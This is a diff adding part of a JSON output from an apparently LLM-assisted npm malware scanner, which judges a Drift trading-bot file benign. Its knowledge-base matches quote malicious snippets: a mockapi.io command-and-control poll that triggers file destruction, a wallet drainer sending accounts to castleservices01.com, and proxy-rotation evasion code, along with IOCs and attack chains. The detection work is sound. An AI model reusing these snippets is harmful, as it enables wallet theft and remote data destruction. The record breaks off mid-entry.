+                    "action": "Decrypted DLL payload is executed via rundll32, running attacker code.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious actions (data theft, persistence, etc.)"
+                  },
+                  {
+                    "step": 5,
+                    "action": "All evidence (scripts, batch files, package.json modifications) is deleted to evade detection.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Stealth and anti-forensics"
+                  },
+                  {
+                    "step": 6,
+                    "action": "In social engineering attacks, user clones a GitHub repo and runs code that attempts to steal crypto wallet funds.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Wallet theft and potential backdoor installation"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Preinstall scripts that execute and then delete local files (e.g., index.js)",
+                    "Install-time network requests to hardcoded IPs/domains (e.g., 103.179.142.171)",
+                    "Creation and execution of batch/PowerShell scripts from JavaScript during npm install",
+                    "DLL execution via rundll32 during npm install process",
+                    "Obfuscated JavaScript in service workers attempting automated wallet transactions"
+                  ],
+                  "file_indicators": [
+                    "preinstall.bat",
+                    "preinstall.ps1",
+                    "sqlite.a",
+                    "sql.tmp",
+                    "preinstall.db",
+                    "index.js (self-deleting)",
+                    "package.json with preinstall hook",
+                    "config/serviceWorker.js with obfuscated code"
+                  ],
+                  "network_indicators": [
+                    "103.179.142.171/npm/npm.mov",
+                    "Other hardcoded IPs and C2s from IOC list",
+                    "Unusual outbound connections during npm install"
+                  ],
+                  "how_to_detect": "Monitor for npm packages with preinstall scripts that execute and then delete files, especially those that write and run batch or PowerShell scripts. Flag any install-time network requests to suspicious or hardcoded IPs such as 103.179.142.171. Detect DLL execution via rundll32 during package installation. Scan for obfuscated JavaScript in service workers or code that attempts automated wallet transactions. Correlate with known IOCs and file hashes for comprehensive detection."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_201020_374245_snippet_1",
+              "source_package": "@zitterorg/a-eius-dolorem (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_201020_374245/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4179142713546753,
+              "code_similarity": 0.3915671408176422,
+              "behavior_similarity": 0.44426143169403076,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// web3c.js\n// Hardcoded blockchain addresses\n// (actual code is minimal or empty, but includes references to blockchain addresses)\nconst teaAddress = '0x1234567890abcdef...'; // Example address\n// ...rest of file is empty or contains only comments",
+                "code_behavior": "At import-time, the code statically references hardcoded blockchain addresses in a JavaScript file, with no functional logic or data processing, resulting in no operational effect but potentially linking the package to blockchain-based reward systems.",
+                "malice_analysis": {
+                  "why_suspicious": "Including hardcoded blockchain addresses in a file that otherwise contains no functional code is highly atypical and suggests the package may be used to game blockchain-based reward systems, act as a placeholder for future malicious payloads, or serve as a marker for automated reward collection.",
+                  "violated_expectations": "A legitimate npm package, especially one purporting to be an ESLint plugin, is expected to provide actual linting or utility functionality. Instead, this package is empty or contains only references to unrelated blockchain addresses, which is inconsistent with normal package development practices.",
+                  "similar_legitimate_use": "Some legitimate packages may include blockchain addresses for donation or configuration purposes, but not in the absence of all other meaningful functionality or code.",
+                  "key_indicators": [
+                    "Presence of hardcoded blockchain addresses in otherwise empty or non-functional files",
+                    "JavaScript files (e.g., lib/web3c.js) containing only comments or static address assignments",
+                    "No functional code or exports present in the file"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "lib/web3c.js",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "@zitterorg/a-eius-dolorem",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (2024-07-xx and later)",
+                  "why_malicious": "The package is part of a coordinated mass-flooding campaign targeting the npm registry. It publishes hundreds of thousands of functionally useless or near-empty packages, which strains registry infrastructure, risks denial-of-service (DoS) conditions, and pollutes the open source ecosystem. The packages are interlinked via dependencies, amplifying the impact and complicating removal, and may serve as a smokescreen for more targeted malicious activity or to exploit blockchain-based reward systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Mass publication of thousands of packages with gibberish or auto-generated names and minimal or empty code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Floods the npm registry, straining registry resources and polluting the open source ecosystem."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Each package declares dependencies on dozens or hundreds of other similarly named packages, creating a recursive dependency web.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Causes resource exhaustion during dependency resolution and complicates package removal for registry operators."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Packages reference hardcoded blockchain addresses, potentially to game blockchain-based reward systems or act as placeholders for future malicious code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "May enable the publisher to receive crypto tokens for publishing or referencing packages, or facilitate future malicious payloads."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Packages with minimal or empty code that statically reference hardcoded blockchain addresses",
+                    "Packages with package.json files declaring large numbers (dozens or hundreds) of dependencies on other similarly named, functionally empty packages from the same publisher",
+                    "Mass publication of packages with gibberish or auto-generated names within a short time frame, especially from a single publisher"
+                  ],
+                  "file_indicators": [
+                    "lib/web3c.js containing only comments or hardcoded blockchain addresses and no functional code",
+                    "package.json files with extensive dependencies on other @zitterorg/* packages that are also non-functional"
+                  ],
+                  "network_indicators": [
+                    "No direct network activity in package code, but indirect indicators include spikes in npm registry access and excessive dependency resolution requests during installation"
+                  ],
+                  "how_to_detect": "Monitor for packages with minimal or empty code, particularly those referencing hardcoded blockchain addresses in JavaScript files. Flag packages whose package.json declares large numbers of dependencies on other packages from the same publisher, especially when those dependencies are also functionally empty. Detect mass publication events involving gibberish or auto-generated package names from a single publisher. Registry operators should watch for sudden spikes in package publication rates and recursive dependency chains that could cause resource exhaustion or DoS conditions."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@drift-labs##jit-proxy/0.16.2/package/lib/jitter/jitterShotgun.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "jitterShotgun_slice_1",
+          "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.JitterShotgun = void 0;\nconst sdk_1 = require(\"@drift-labs/sdk\");\nconst baseJitter_1 = require(\"./baseJitter\");\nclass JitterShotgun extends baseJitter_1.BaseJitter {\n    constructor({ auctionSubscriber, jitProxyClient, driftClient, userStatsMap, swiftOrderSubscriber, slotSubscriber, auctionSubscriberIgnoresSwiftOrders, }) {\n        super({\n            auctionSubscriber,\n            jitProxyClient,\n            driftClient,\n            userStatsMap,\n            swiftOrderSubscriber,\n            slotSubscriber,\n            auctionSubscriberIgnoresSwiftOrders,\n        });\n    }\n    createTryFill(taker, takerKey, takerStatsKey, order, orderSignature) {\n        return async () => {\n            var _a;\n            let i = 0;\n            const takerStats = await this.userStatsMap.mustGet(taker.authority.toString());\n            const referrerInfo = takerStats.getReferrerInfo();\n            // assumes each preflight simulation takes ~1 slot\n            while (i < order.auctionDuration) {\n                const params = this.perpParams.get(order.marketIndex);\n                if (!params) {\n                    this.deleteOnGoingAuction(orderSignature);\n                    return;\n                }\n                const txParams = {\n                    computeUnits: this.computeUnits,\n                    computeUnitsPrice: this.computeUnitsPrice,\n                };\n                console.log(`Trying to fill ${orderSignature}`);\n                try {\n                    const { txSig } = await this.jitProxyClient.jit({\n                        takerKey,\n                        takerStatsKey,\n                        taker,\n                        takerOrderId: order.orderId,\n                        maxPosition: params.maxPosition,\n                        minPosition: params.minPosition,\n                        bid: params.bid,\n                        ask: params.ask,\n                        postOnly: (_a = params.postOnlyParams) !== null && _a !== void 0 ? _a : sdk_1.PostOnlyParams.MUST_POST_ONLY,\n                        priceType: params.priceType,\n                        referrerInfo,\n                        subAccountId: params.subAccountId,\n                    }, txParams);\n                    console.log(`Successfully sent tx for ${orderSignature} txSig ${txSig}`);\n                    await sleep(10000);\n                    this.deleteOnGoingAuction(orderSignature);\n                    return;\n                }\n                catch (e) {\n                    console.error(`Failed to fill ${orderSignature}`);\n                    if (e.message.includes('0x1770') || e.message.includes('0x1771')) {\n                        console.log('Order does not cross params yet, retrying');\n                    }\n                    else if (e.message.includes('0x1779')) {\n                        console.log('Order could not fill');\n                    }\n                    else if (e.message.includes('0x1793')) {\n                        console.log('Oracle invalid, retrying');\n                    }\n                    else {\n                        await sleep(10000);\n                        this.deleteOnGoingAuction(orderSignature);\n                        return;\n                    }\n                }\n                i++;\n            }\n            this.deleteOnGoingAuction(orderSignature);\n        };\n    }\n    createTrySignedMsgFill(authorityToUse, signedMsgOrderParams, uuid, taker, takerKey, takerStatsKey, order, orderSignature, marketIndex) {\n        return async () => {\n            var _a;\n            let i = 0;\n            const takerStats = await this.userStatsMap.mustGet(taker.authority.toString());\n            const referrerInfo = takerStats.getReferrerInfo();\n            // assumes each preflight simulation takes ~1 slot\n            while (i < order.auctionDuration) {\n                const params = this.perpParams.get(order.marketIndex);\n                if (!params) {\n                    this.deleteOnGoingAuction(orderSignature);\n                    return;\n                }\n                const txParams = {\n                    computeUnits: this.computeUnits,\n                    computeUnitsPrice: this.computeUnitsPrice,\n                };\n                console.log(`Trying to fill ${orderSignature}`);\n                try {\n                    const { txSig } = await this.jitProxyClient.jitSignedMsg({\n                        takerKey,\n                        takerStatsKey,\n                        taker,\n                        takerOrderId: order.orderId,\n                        maxPosition: params.maxPosition,\n                        minPosition: params.minPosition,\n                        bid: params.bid,\n                        ask: params.ask,\n                        postOnly: (_a = params.postOnlyParams) !== null && _a !== void 0 ? _a : sdk_1.PostOnlyParams.MUST_POST_ONLY,\n                        priceType: params.priceType,\n                        referrerInfo,\n                        subAccountId: params.subAccountId,\n                        authorityToUse,\n                        signedMsgOrderParams,\n                        uuid,\n                        marketIndex,\n                    }, txParams);\n                    console.log(`Successfully sent tx for ${orderSignature} txSig ${txSig}`);\n                    await sleep(10000);\n                    this.deleteOnGoingAuction(orderSignature);\n                    return;\n                }\n                catch (e) {\n                    console.error(`Failed to fill ${orderSignature}`);\n                    console.log(e);\n                    if (e.message.includes('0x1770') || e.message.includes('0x1771')) {\n                        console.log('Order does not cross params yet, retrying');\n                    }\n                    else if (e.message.includes('0x1779')) {\n                        console.log('Order could not fill');\n                    }\n                    else if (e.message.includes('0x1793')) {\n                        console.log('Oracle invalid, retrying');\n                    }\n                    else {\n                        await sleep(10000);\n                        this.deleteOnGoingAuction(orderSignature);\n                        return;\n                    }\n                }\n                i++;\n            }\n            this.deleteOnGoingAuction(orderSignature);\n        };\n    }\n}\nexports.JitterShotgun = JitterShotgun;\nfunction sleep(ms) {\n    return new Promise((resolve) => setTimeout(resolve, ms));\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.3889226377010346,
+          "confidence": 0.2,
+          "behavior_summary": "When called, the code asynchronously interacts with a proxy client via network API calls (jitProxyClient.jit and jitProxyClient.jitSignedMsg) to submit orders for execution, using data retrieved from userStatsMap and order parameters. It accesses user statistics and order details, performs repeated attempts to fill orders with transaction parameters, and handles errors based on specific error codes. This behavior facilitates automated order execution and transaction submission over the network, potentially enabling unauthorized or automated trading actions.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements automated order execution logic interacting with a proxy client to submit trading orders repeatedly until success or failure. While it performs automated network calls and retries, these behaviors align with legitimate automated trading or market-making bots rather than malware. There is no evidence of obfuscation, data exfiltration, command-and-control communication, or evasion techniques such as proxy rotation or fingerprint spoofing. The known malicious patterns in the knowledge base involve proxy rotation for evasion, scalping bots with distributed inventory checks, or command-and-control polling for destructive payloads, none of which match the behavior or intent of this code. The code’s use of domain-specific APIs (jitProxyClient.jit, userStatsMap) and error handling for trading-related error codes further supports a legitimate trading automation context.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113202_101350_snippet_4",
+              "source_package": "Akamai WEB and BMP API (underground botting tool) (N/A (proprietary/underground tool, not a public package manager))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113202_101350/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3996517062187195,
+              "code_similarity": 0.35470521450042725,
+              "behavior_similarity": 0.4445981979370117,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "Proxy rotation and fingerprint spoofing:\nconst proxy = getNextResidentialProxy();\nlaunchBrowser({ proxy, userAgent: randomUserAgent(), timezone: randomTimezone() });",
+                "code_behavior": "At runtime, the code selects a new residential proxy, launches a browser instance with randomized user agent and timezone settings, and initiates automated actions, resulting in evasion of anti-bot detection through proxy rotation and fingerprint spoofing.",
+                "malice_analysis": {
+                  "why_suspicious": "Rotating through residential proxies and spoofing browser fingerprints are established evasion techniques to avoid detection by anti-bot and anti-abuse systems.",
+                  "violated_expectations": "Legitimate automation does not require residential proxy usage or manipulation of browser fingerprints to mimic diverse users.",
+                  "similar_legitimate_use": "Web scraping for research or competitive analysis, but only with explicit permission and transparency, not for evasion.",
+                  "key_indicators": [
+                    "Frequent changes in proxy IP addresses, especially residential ranges",
+                    "Randomization of browser user agent and timezone per session",
+                    "Presence of proxy and fingerprint configuration logic"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (during evasion of anti-bot detection)",
+                  "file_location": "proxy configuration and browser fingerprinting modules",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Akamai WEB and BMP API (underground botting tool)",
+                  "package_manager": "N/A (proprietary/underground tool, not a public package manager)",
+                  "package_versions": "Unknown (likely multiple, as updated for bypasses)",
+                  "why_malicious": "This tool is explicitly designed and marketed for bypassing anti-bot protections on major retail and sneaker sites, enabling automated credential stuffing, account takeover, and fake account generation attacks. Its features and underground distribution indicate intent to facilitate fraud, large-scale abuse, and unauthorized access to protected resources."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obtain or purchase credential lists and/or fake account generation methods.",
+                    "implemented_by": [],
+                    "leads_to": "Automated attack execution"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Automate login attempts using credential stuffing or credential cracking.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Account takeover or credential validation"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Automate fake account creation to scale fraud or abuse.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Mass fake accounts for fraud, laundering, or abuse"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Bypass anti-bot protections using CAPTCHA solver services.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Uninterrupted automation"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Evade detection by rotating proxies and spoofing browser fingerprints.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Sustained, undetected attack activity"
+                  },
+                  {
+                    "step": 6,
+                    "action": "Monetize compromised or fake accounts (sell, launder, abuse).",
+                    "implemented_by": [],
+                    "leads_to": "Financial gain for attacker"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "High volume of login attempts from diverse IP addresses and user agents within short timeframes",
+                    "Rapid, repeated account creation attempts with similar registration patterns and generated data",
+                    "Frequent use of residential proxies and observable proxy rotation during sessions",
+                    "Automated CAPTCHA solving via outbound requests to known solver API domains"
+                  ],
+                  "file_indicators": [
+                    "Automation scripts referencing Puppeteer, Playwright, or Selenium libraries",
+                    "Configuration files or scripts containing proxy lists, credential input, or fingerprint spoofing logic",
+                    "Hardcoded or dynamically referenced solver service API endpoints in code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP(S) connections to CAPTCHA solver service domains (e.g., solver-service.com)",
+                    "Frequent IP address changes associated with residential proxy providers during authentication or registration flows",
+                    "Unusual spikes in login or registration traffic from IPs with inconsistent geolocation or user agent strings"
+                  ],
+                  "how_to_detect": "Monitor authentication and registration endpoints for high-frequency attempts from varying IP addresses and user agents, especially those matching residential proxy ranges. Flag HTTP headers or browser fingerprints indicative of automation tools (e.g., Puppeteer/Playwright). Detect outbound network requests to known CAPTCHA solver API domains. Correlate rapid account creation or login failures with proxy and fingerprint rotation patterns to identify automated abuse."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113150_328393_snippet_1",
+              "source_package": "Scalper Botnet (multiple variants) (N/A (custom botnet infrastructure))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113150_328393/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3849630057811737,
+              "code_similarity": 0.27379775047302246,
+              "behavior_similarity": 0.49612826108932495,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "HTTP GET requests to /inventory endpoints for 62 specific items in various sizes, distributed across 11 networks in 7 countries, using HTTP/2.0 and Chrome-like headers.",
+                "code_behavior": "At runtime, the code sends repeated HTTP GET requests to inventory endpoints for specific products, using browser-mimicking headers and distributed IPs, to check stock availability and inform scalping operations.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated, high-frequency inventory checks from distributed sources with browser-mimicking headers are typical of scalping bots and are designed to evade basic anti-bot protections.",
+                  "violated_expectations": "Normal users do not repeatedly check inventory for dozens of items in rapid succession from multiple global IPs, nor do they rotate through browser fingerprints at this scale.",
+                  "similar_legitimate_use": "Automated inventory monitoring by retailers or price comparison services, but these typically operate at lower frequency, use official APIs, and do not obfuscate their identity or distribute requests globally.",
+                  "key_indicators": [
+                    "High-frequency, targeted inventory endpoint access",
+                    "Distributed requests from residential IPs across multiple countries",
+                    "Sophisticated browser fingerprinting (HTTP/2.0, Chrome headers)",
+                    "Unusual request patterns not matching human behavior"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (continuous polling)",
+                  "file_location": "custom botnet client (cloud or residential IPs)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Scalper Botnet (multiple variants)",
+                  "package_manager": "N/A (custom botnet infrastructure)",
+                  "package_versions": "N/A (multiple botnet implementations observed)",
+                  "why_malicious": "These botnets automate the process of scraping inventory, pricing, and discount information, and perform automated purchasing actions to hoard limited-availability goods for resale, depriving legitimate users of access and distorting the retail market. The coordinated use of distributed IPs, browser-mimicking headers, and disposable email accounts enables large-scale, evasive abuse of retail platforms."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Botnet initiates high-frequency inventory and product data scraping for targeted items.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Identification of in-stock, high-demand products for scalping."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Botnet uses pre-created fake accounts with disposable emails to automate login and checkout workflows.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Automated purchase of limited-availability goods ahead of legitimate users."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Goods are hoarded for resale on secondary markets, depriving legitimate customers.",
+                    "implemented_by": [],
+                    "leads_to": "Final goal: profit from resale of scarce goods."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "High-frequency, targeted inventory endpoint access from distributed or cloud IPs",
+                    "Bulk product catalog scraping with outdated or inconsistent browser user agents",
+                    "Automated login and checkout attempts using disposable email domains",
+                    "Malformed or anomalous HTTP headers in requests",
+                    "Rotation of user agents and IP addresses in short timeframes"
+                  ],
+                  "file_indicators": [
+                    "N/A (network-based botnet activity, not file-based)"
+                  ],
+                  "network_indicators": [
+                    "HTTP/1.1 requests with outdated Chrome user agents from cloud providers",
+                    "HTTP/2.0 requests with multiple outdated Firefox user agents",
+                    "Requests with anomalous or malformed HTTP headers (e.g., unexpected header order, missing standard headers)",
+                    "Login attempts from accounts using disposable email domains (e.g., duschgelmail.com, sablx.com)",
+                    "High-volume requests to /inventory and product catalog endpoints from non-residential or rapidly changing IPs"
+                  ],
+                  "how_to_detect": "Monitor for high-frequency inventory and product data requests, especially from distributed residential or cloud IPs, with browser user agents that are outdated, inconsistent, or rapidly rotated. Flag requests with malformed HTTP headers or unusual header order. Correlate login and checkout attempts using disposable email domains, and investigate bulk account creation or login patterns. Use behavioral analytics to distinguish between legitimate user activity and automated botnet patterns, focusing on request rates, user agent diversity, header anomalies, and the use of disposable email domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_063579_snippet_3",
+              "source_package": "transferwise-iconfont (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_063579/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3831101357936859,
+              "code_similarity": 0.3722425699234009,
+              "behavior_similarity": 0.39397770166397095,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "setInterval(() => {\n  fetch('https://6514b3f1dc3282a6a3cd7125.mockapi.io/server/1').then(_0x231e3e => _0x231e3e.json()).then(_0x361fb2 => {\n    if (_0x361fb2.isAngry) {\n      angry();\n    }\n  })['catch'](_0x5d61c5 => {})[\"finally\"](_0x1c49c6 => {});\n}, 0xbb8);",
+                "code_behavior": "At runtime, the code periodically (every 3 seconds) polls a hardcoded remote server for a trigger value; if the server responds with isAngry=true, it executes the destructive angry() function, enabling remote-controlled data destruction via command-and-control.",
+                "malice_analysis": {
+                  "why_suspicious": "The code establishes a command-and-control channel by polling an external server for instructions, which is a common malware technique, and enables remote activation of destructive payloads.",
+                  "violated_expectations": "A utility package should not make unsolicited network requests or execute remote-controlled destructive actions based on external input.",
+                  "similar_legitimate_use": "Some legitimate software checks for updates or configuration from a server, but never for destructive triggers or to execute shell commands.",
+                  "key_indicators": [
+                    "Periodic polling of external server (6514b3f1dc3282a6a3cd7125.mockapi.io)",
+                    "Conditional execution of destructive payload based on remote response",
+                    "Obfuscated and hidden within unrelated functionality",
+                    "No user notification or consent for remote-controlled actions"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (periodic polling after package import, conditional on directory name and remote server response)",
+                  "file_location": "main module file of protect-api (e.g., index.js)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "transferwise-iconfont",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a typosquat of a legitimate library and contains code that collects sensitive system and user data, including home directory, hostname, username, DNS servers, and package metadata, then exfiltrates it to an attacker-controlled server via HTTPS POST. It does not provide the claimed icon font functionality and is designed solely for data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package (transferwise-iconfont or protect-api).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "transferwise-iconfont collects sensitive system and user data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "transferwise-iconfont exfiltrates collected data to attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "protect-api periodically polls a remote server for a trigger value.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Waits for remote command to activate destructive payload."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If the remote server responds with isAngry=true, protect-api executes the angry() function.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Destructive shell commands are executed, deleting all files on the system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited collection and exfiltration of system/user data at import or runtime",
+                    "Hardcoded external domains for data exfiltration or command-and-control",
+                    "Periodic polling of remote servers for execution triggers",
+                    "Execution of destructive shell commands (e.g., 'rm -rf /') from within JavaScript packages",
+                    "Obfuscated or hidden code paths leading to data destruction"
+                  ],
+                  "file_indicators": [
+                    "Presence of code referencing 'os.homedir()', 'os.userInfo()', 'os.hostname()', or 'dns.getServers()' in non-system utility packages",
+                    "Use of shelljs or similar modules to execute shell commands",
+                    "Functions named 'angry' or similar, especially if not documented",
+                    "Obfuscated code blocks or suspicious setInterval/fetch patterns"
+                  ],
+                  "network_indicators": [
+                    "Connections to r7z12f7knlides86u06z22fpzg57tzho.oastify.com",
+                    "Connections to 6514b3f1dc3282a6a3cd7125.mockapi.io",
+                    "Unusual POST requests containing system/user data to unknown domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive system/user information and make unsolicited network requests to hardcoded domains. Flag packages that use shelljs or similar modules to execute shell commands, especially those containing 'rm -rf' or other destructive operations. Detect periodic polling of external servers for remote triggers, and review for obfuscated code or hidden destructive functions. Use static analysis to identify suspicious API usage and dynamic analysis to observe runtime network and filesystem behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780352_snippet_2",
+              "source_package": "lottie-player (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780352/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.38239094614982605,
+              "code_similarity": 0.3634212613105774,
+              "behavior_similarity": 0.4013606309890747,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Malicious wallet drainer logic (representative):\nwindow.ethereum.request({ method: 'eth_requestAccounts' })\n  .then(accounts => {\n    // Exfiltrate assets\n    fetch('wss://castleservices01.com', { method: 'POST', body: JSON.stringify({ accounts }) });\n    // Initiate draining transactions\n    // ...\n  });",
+                "code_behavior": "At runtime, after the user interacts with a wallet connect prompt, the code requests access to the user's web3 wallet, collects account information, sends this data to the attacker's server via WebSocket or HTTP POST, and initiates unauthorized transactions to transfer assets to attacker-controlled addresses.",
+                "malice_analysis": {
+                  "why_suspicious": "The code abuses the wallet connection process to exfiltrate sensitive wallet information and automate asset transfers, which is a hallmark of crypto drainer malware.",
+                  "violated_expectations": "A legitimate animation player should never interact with web3 wallets, prompt for wallet connections, or initiate asset transfers.",
+                  "similar_legitimate_use": "Legitimate decentralized applications (dApps) prompt for wallet connection only for transparent, user-initiated actions and never exfiltrate wallet data to untrusted domains.",
+                  "key_indicators": [
+                    "Unsolicited wallet connection prompts on non-crypto-related sites",
+                    "Use of window.ethereum.request for eth_requestAccounts outside of dApp context",
+                    "Outbound WebSocket or HTTP(S) requests to castleservices01.com or similar domains",
+                    "Automated transaction logic following wallet connection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user interaction)",
+                  "file_location": "Injected by drainer.js (loaded at runtime)",
+                  "required_permissions": [
+                    "network",
+                    "web3 wallet access",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "lottie-player",
+                  "package_manager": "npm",
+                  "package_versions": "2.0.5, 2.0.6, 2.0.7",
+                  "why_malicious": "Versions 2.0.5, 2.0.6, and 2.0.7 of the lottie-player npm package were compromised in a supply chain attack. The attacker injected code that loads a remote crypto drainer script, which prompts users to connect their cryptocurrency wallets and then exfiltrates assets (cryptocurrency and NFTs) to attacker-controlled addresses. This malicious behavior is unrelated to the legitimate functionality of an animation library and poses a severe risk to users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious lottie-player package is loaded by the website (via CDN or npm), triggering the import-time execution of injected code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Loads remote drainer script from attacker-controlled domain (castleservices01.com)."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The drainer script, once loaded, injects a wallet connect UI and prompts the user to connect their crypto wallet.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is deceived into connecting their wallet, granting access to wallet information."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Upon wallet connection, the script exfiltrates wallet information and initiates unauthorized transactions to steal assets.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Victim's cryptocurrency and NFTs are transferred to attacker-controlled addresses."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Dynamic script injection from domains not affiliated with LottieFiles (e.g., castleservices01.com) during import-time of lottie-player.js",
+                    "Wallet connect prompts or web3 wallet access requests on sites not expected to interact with cryptocurrency wallets",
+                    "Outbound WebSocket or HTTP(S) connections to known phishing or drainer domains (e.g., castleservices01.com) following wallet connection"
+                  ],
+                  "file_indicators": [
+                    "dist/lottie-player.js containing references to castleservices01.com or similar suspicious domains",
+                    "Presence of dynamically injected <script> elements with src attributes pointing to external drainer payloads",
+                    "Unexpected modifications or additions to lottie-player.js in npm package versions 2.0.5, 2.0.6, or 2.0.7"
+                  ],
+                  "network_indicators": [
+                    "Any network connections (HTTP, HTTPS, WebSocket) to castleservices01.com",
+                    "Outbound requests to domains with a history of crypto phishing or drainer activity after loading animation libraries"
+                  ],
+                  "how_to_detect": "Monitor for external script loads initiated by lottie-player.js, especially from domains not associated with LottieFiles. Flag any wallet connect prompts or web3 wallet access requests on sites that do not provide crypto-related functionality. Detect and alert on outbound network connections to known drainer or phishing domains (such as castleservices01.com) after loading animation libraries. Use file integrity monitoring to detect unauthorized changes or suspicious references in npm package files, particularly in dist/lottie-player.js for the affected versions."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202034_074695_snippet_2",
